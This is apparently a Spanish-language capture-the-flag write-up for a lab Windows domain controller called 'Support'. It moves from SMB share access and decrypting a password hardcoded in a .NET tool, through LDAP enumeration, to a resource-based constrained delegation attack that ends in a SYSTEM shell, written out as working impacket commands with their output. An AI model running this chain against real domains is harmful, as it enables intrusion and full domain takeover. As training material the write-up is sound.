
# Support

<figure><img src="/files/RbY0vrIncDzYxyfTZs91" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Support`
* **IP:** `10.129.5.151`
* **Sistema operativo:** `Windows`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `25/05/2026`

***

## <mark style="color:$primary;">Configuración del host</mark>

#### /etc/passwd

Añadimos la IP a nuestro `/etc/hosts`

```bash
echo "10.129.5.151 dc.support.htb dc support.htb" | sudo tee -a /etc/hosts
```

## <mark style="color:$primary;">Escaneo de puertos</mark>

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.5.145
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-25 15:58:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Encontramos multitud de puertos abiertos, lo normal en máquinas Windows. Ademas nos encontramos con que la máquina objetivo es un Domain Controller, por la presencia de los puertos 3268 o 389, reservados para DCs.

Destacan los puertos:

* `111 (RPC)` - Puede contener recursos compartidos o enumerar usuarios
* `445 (SMB)` - Recursos compartidos y enumeración
* `5985 (WinRM)` - Acceso con EvilWinRM con contraseña
* `88 (Kerberos)` - Posible Kerberoasting o AS-REP Roasting

### Enumerar Shares

Encontramos 2 shares con permisos de lectura, `IPC$` y `support-tools`:

{% code overflow="wrap" %}

```bash
smbmap -H 10.129.5.151 -u admin -p '' 
```

{% endcode %}

<figure><img src="/files/x51LHTOVjdvmyqoSxo1P" alt=""><figcaption></figcaption></figure>

### Acceso SMB

Encontramos un archivo ZIP interesante: `UserInfo.exe.zip`

{% code overflow="wrap" %}

```bash
smbclient //10.129.5.151/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 21 01:01:06 2022
  ..                                  D        0  Sat May 28 19:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022
  putty.exe                           A  1273576  Sat May 28 19:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022

		4026367 blocks of size 4096. 959377 blocks available
smb: \> get UserInfo.exe.zip 
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (816,3 KiloBytes/sec) (average 816,3 KiloBytes/sec)
```

{% endcode %}

Nos los descargamos y lo extraemos para ver su contenido:

{% code overflow="wrap" %}

```bash
unzip UserInfo.exe.zip
```

{% endcode %}

```bash
ls -la
drwxrwxr-x kali kali 4.0 KB Mon May 25 23:42:58 2026  .
drwxrwxr-x kali kali 4.0 KB Mon May 25 23:42:52 2026  ..
.rw-rw-rw- kali kali  98 KB Wed Mar  2 02:18:50 2022  CommandLineParser.dll
.rw-rw-rw- kali kali  22 KB Sat Oct 23 07:42:08 2021  Microsoft.Bcl.AsyncInterfaces.dll
.rw-rw-rw- kali kali  46 KB Sat Oct 23 07:48:04 2021  Microsoft.Extensions.DependencyInjection.Abstractions.dll
.rw-rw-rw- kali kali  83 KB Sat Oct 23 07:48:22 2021  Microsoft.Extensions.DependencyInjection.dll
.rw-rw-rw- kali kali  63 KB Sat Oct 23 07:51:24 2021  Microsoft.Extensions.Logging.Abstractions.dll
.rw-rw-rw- kali kali  20 KB Wed Feb 19 18:05:18 2020  System.Buffers.dll
.rw-rw-rw- kali kali 138 KB Wed Feb 19 18:05:18 2020  System.Memory.dll
.rw-rw-rw- kali kali 113 KB Tue May 15 21:29:44 2018  System.Numerics.Vectors.dll
.rw-rw-rw- kali kali  18 KB Sat Oct 23 07:40:18 2021  System.Runtime.CompilerServices.Unsafe.dll
.rw-rw-rw- kali kali  25 KB Wed Feb 19 18:05:18 2020  System.Threading.Tasks.Extensions.dll
.rwxrwxrwx kali kali  12 KB Sat May 28 01:51:05 2022  UserInfo.exe
.rw-rw-rw- kali kali 563 B  Sat May 28 00:59:39 2022  UserInfo.exe.config
.rw-r--r-- kali kali 271 KB Mon May 25 23:42:22 2026  UserInfo.exe.zip
```

Encontramos bastantes dlls y un ejecutable `UserInfo.exe`. El archivo .config revela que es una aplicación en `.NET 4.8`:

```xml
cat UserInfo.exe.config 

<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
    </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>
```

### Análisis del binario

Usaremos ilspycmd, lo podemos instalar en Kali con:

```bash
dotnet tool install --global ilspycmd --version 8.0.0.7345
export PATH="$PATH:$HOME/.dotnet/tools"
ilspycmd --version
```

Y ejecutamos el siguiente comando para analizar el ejecutable:

```bash
ilspycmd UserInfo.exe > source.cs
grep -i -E "ldap|pass|key|aes|decrypt" source.cs

		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
		public static string getPassword()
			byte[] array = Convert.FromBase64String(enc_password);
				array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
	internal class LdapQuery
		public LdapQuery()
			string password = Protected.getPassword();
			entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
					Console.WriteLine("[*] LDAP query to use: " + text);
					Console.WriteLine("Last Password Change: " + DateTime.FromFileTime((long)val.Properties["pwdLastSet"][0]));
			new LdapQuery().query(commandOptions.FirstName, commandOptions.LastName, options.Verbose);
			new LdapQuery().printUser(commandOptions.UserName, options.Verbose);
```

En la primera l´nea encontramos la contraseña encriptada. Junto a él, vemos el usuario `support\ldap` y el servidor LDAP `LDAP://support.htb`. También aparece el nombre `armando`, que podría ser otro usuario del dominio.

Y tenemos el algoritmo exacto:

```c
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
key = "armando";

array2[i] = (array[i] ^ key[i % key.Length]) ^ 0xDF;
```

### Desencriptar contraseña

Podemos usar el siguiente script en python:

```python
python3 - << 'EOF'
import base64

enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc)
password = bytes((b ^ key[i % len(key)] ^ 0xDF) for i, b in enumerate(data))

print(password.decode())
EOF

nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Tenemos la contraseña en texto plano de ldap: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

#### Comprobar contraseña

```bash
crackmapexec smb 10.129.5.151 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

SMB         10.129.5.151    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.5.151    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

***

## <mark style="color:$primary;">Enumeración inicial</mark>

#### Con usuario y contraseña

```bash
enum4linux-ng -A -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb
```

Obtenemos multitud de información del dominio

***

## <mark style="color:$primary;">Enumeración de Active Directory</mark>

### Enumeración de usuarios/grupos

```bash
crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users

SMB         support.htb     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         support.htb     445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
SMB         support.htb     445    DC               [+] Enumerated domain user(s)
SMB         support.htb     445    DC               support.htb\ford.victoria                  badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\stoll.rachelle                 badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\daughtler.mabel                badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\langley.lucy                   badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\west.laura                     badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\monroe.david                   badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\cromwell.gerard                badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\bardot.mary                    badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\raven.clifton                  badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\levine.leopoldo                badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\thomas.raphael                 badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\anderson.damian                badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\wilson.shelby                  badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\hernandez.stanley              badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\smith.rosario                  badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\support                        badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\ldap                           badpwdcount: 0 desc: 
SMB         support.htb     445    DC               support.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         support.htb     445    DC               support.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         support.htb     445    DC               support.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

Añadimos los usuarios encontramos a un archivo `valid-users.txt`. Lo podemos hacer con el siguiente comando:

```bash
crackmapexec smb support.htb \
-u ldap \
-p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
--users | awk -F'\\\\' '/support.htb\\/ {print $2}' | awk '{print $1}' > valid-users.txt
```

Probar a volcar tickets Kerberos mediante ASREP-Roasting falla:

```bash
impacket-GetNPUsers support.htb/ -usersfile valid-users.txt -dc-ip 10.129.5.151

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User ford.victoria doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User stoll.rachelle doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User daughtler.mabel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User langley.lucy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User west.laura doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User monroe.david doesn't have UF_DONT_REQUIRE_PREAUTH set
<----SNIP---->
```

### Ldapsearch

```bash
ldapsearch -x -H ldap://support.htb \
-D 'support\ldap' \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b 'dc=support,dc=htb' \
'(sAMAccountName=support)' '*'

# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (sAMAccountName=support)
# requesting: * 
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
<----SNIP---->
```

Observamos que tienemos la contraseña en plano del usuario support:

```
info: Ironside47pleasure40Watchful
```

### Conexión Evil WinRM

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents>
```

## <mark style="color:$primary;">User Flag</mark>

```bash
*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
27a5a22105fa0d3fe461e392********
```

***

## <mark style="color:$primary;">Enumeración con Bloodhound</mark>

### Bloodhound Python

```bash
bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.129.5.151 -c All

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.support.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 09S
```

### Análisis con Bloodhound

#### Ruta más corta a Domain Admin

Usaremos la siguiente Cypher Query:

```cypher
MATCH p=shortestPath((n:User)-[*1..]->(m:Group))
WHERE toUpper(m.name) = "DOMAIN ADMINS@SUPPORT.HTB"
RETURN p
```

<figure><img src="/files/yjFb8stzpn0zcy3vHZeG" alt=""><figcaption></figcaption></figure>

El punto clave es este permiso:

```
SHARED SUPPORT ACCOUNTS ── GenericAll ──> DC.SUPPORT.HTB
```

Eso significa que los miembros del grupo `Shared Support Accounts` (incluido el usuario `support`) tienen control total sobre el objeto computadora del DC.

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### 1. Crea una cuenta máquina

```bash
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
-computer-name 'ATTACK$' \
-computer-pass 'Password123!' \
-dc-ip 10.129.5.151

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACK$ with password Password123!.
```

### 2. Configura RBCD sobre DC$

```bash
impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
-dc-ip 10.129.5.151 \
-action write \
-delegate-from 'ATTACK$' \
-delegate-to 'DC$'

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACK$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACK$      (S-1-5-21-1677581083-3380853377-188903654-6101)
```

### 3. Solicita ticket como Administrator para CIFS/DC

```bash
impacket-getST support.htb/'ATTACK$':'Password123!' \
-dc-ip 10.129.5.151 \
-spn cifs/dc.support.htb \
-impersonate Administrator

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Esto debería crear un `.ccache`.

### 4. Exporta el ticket

```bash
export KRB5CCNAME='Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache'
```

#### Comprobación

```bash
klist                         
Ticket cache: FILE:Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
Default principal: Administrator@support.htb

Valid starting     Expires            Service principal
26/05/26 01:23:50  26/05/26 11:23:50  cifs/dc.support.htb@SUPPORT.HTB
	renew until 27/05/26 01:23:50
```

### 5. Obtener shell SYSTEM

```bash
impacket-psexec -k -no-pass dc.support.htb

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file IcRudGnZ.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service qtua on dc.support.htb.....
[*] Starting service qtua.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
C:\Windows\system32> cd c:/Users/Administrator/Desktop

c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of c:\Users\Administrator\Desktop

05/28/2022  04:17 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          ..
05/25/2026  08:57 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,972,628,480 bytes free

c:\Users\Administrator\Desktop> type root.txt
7f9acc2882f70d40e0c70fde********
```
